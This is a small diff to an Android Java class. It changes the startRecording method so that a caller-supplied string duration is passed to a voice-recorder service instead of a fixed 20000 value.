@@ -10,13 +10,13 @@ import UiActivities.MainActivity;
 import synceAdapter.AccountConstants;
 
 public class recorderClass {
-    public static void startRecording(Context context , int t){
+    public static void startRecording(Context context , String t){
         boolean flag = AccountConstants.isaudioRecording;
         if (!flag){
             try {
                 Intent intent = new Intent(context.getApplicationContext() , VoiceRecorderService.class);
                 intent.putExtra("isRecording" , true);
-                intent.putExtra("time" , 20000);
+                intent.putExtra("time" , t);
                 context.startService(intent);
             }catch (Exception e){}
         }
